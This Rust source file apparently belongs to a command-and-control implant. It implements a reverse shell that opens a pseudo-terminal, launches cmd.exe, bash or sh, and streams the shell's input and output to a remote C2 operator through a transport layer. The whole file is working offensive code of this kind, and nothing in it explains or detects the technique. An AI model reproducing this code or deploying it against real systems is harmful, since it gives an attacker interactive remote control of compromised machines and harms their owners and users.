use alloc::string::String;
use alloc::sync::Arc;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
use portable_pty::{CommandBuilder, PtySize, native_pty_system};
use std::io::{Read, Write};
use std::sync::mpsc;
use std::thread;
use transport::SyncTransport;

pub fn reverse_shell_pty(
    transport: Arc<dyn SyncTransport>,
    task_id: i64,
    cmd: Option<String>,
) -> Result<()> {
    // 1. Setup PTY
    let pty_system = native_pty_system();
    let pair = pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    })?;

    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(target_os = "windows")]
            {
                CommandBuilder::new("cmd.exe")
            }
            #[cfg(not(target_os = "windows"))]
            {
                if std::path::Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
        }
    };

    let mut child = pair.slave.spawn_command(cmd_builder)?;
    let mut reader = pair.master.try_clone_reader()?;
    let mut writer = pair.master.take_writer()?;

    // 2. Setup Channels
    // Output: PTY -> C2 (Request)
    let (out_tx, out_rx) = mpsc::channel();
    // Input: C2 -> PTY (Response)
    let (in_tx, in_rx) = mpsc::channel();

    // 3. Spawn Reader Thread (PTY -> out_tx)
    let out_tx_clone = out_tx.clone();
    thread::spawn(move || {
        // Send Ping first
        let _ = out_tx_clone.send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        });

        let mut buf = [0u8; 1024];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    let _ = out_tx_clone.send(ReverseShellRequest {
                        task_id,
                        kind: ReverseShellMessageKind::Data.into(),
                        data: buf[..n].to_vec(),
                    });
                    // Ping to flush (optional, matching previous logic)
                    let _ = out_tx_clone.send(ReverseShellRequest {
                        task_id,
                        kind: ReverseShellMessageKind::Ping.into(),
                        data: Vec::new(),
                    });
                }
                Err(_) => break,
            }
        }
    });

    // 4. Spawn Transport (Blocking)
    // We run transport in a separate thread so we can handle input loop here
    let transport_clone = transport.clone();
    let transport_thread = thread::spawn(move || transport_clone.reverse_shell(out_rx, in_tx));

    // 5. Input Loop (in_rx -> PTY Writer)
    for msg in in_rx {
        if msg.kind == ReverseShellMessageKind::Ping as i32 {
            let _ = out_tx.send(ReverseShellRequest {
                kind: ReverseShellMessageKind::Ping.into(),
                data: msg.data,
                task_id,
            });
        } else {
            let _ = writer.write_all(&msg.data);
        }

        // Check if child exited
        if let Ok(Some(_)) = child.try_wait() {
            break;
        }
    }

    let _ = child.kill();
    let _ = transport_thread.join();

    Ok(())
}
